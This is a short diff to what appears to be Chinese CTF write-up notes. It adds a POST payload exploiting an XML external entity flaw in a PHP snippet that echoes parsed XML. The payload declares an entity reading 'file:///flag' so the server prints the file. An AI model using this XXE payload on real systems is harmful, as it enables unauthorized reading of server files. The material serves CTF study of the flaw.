@@ -377,6 +377,17 @@ if(isset($xmlfile)){
     $ctfshow = $creds->ctfshow;
     echo $ctfshow;
 }
+
+[POST]Payload:
+
+<?xml version="1.0"?>
+<!DOCTYPE payload [
+<!ELEMENT payload ANY>
+<!ENTITY xxe SYSTEM "file:///flag">
+]>
+<creds>
+<ctfshow>&xxe;</ctfshow>
+</creds>
 ```
 
 ## **引发信息泄露的危险函数**
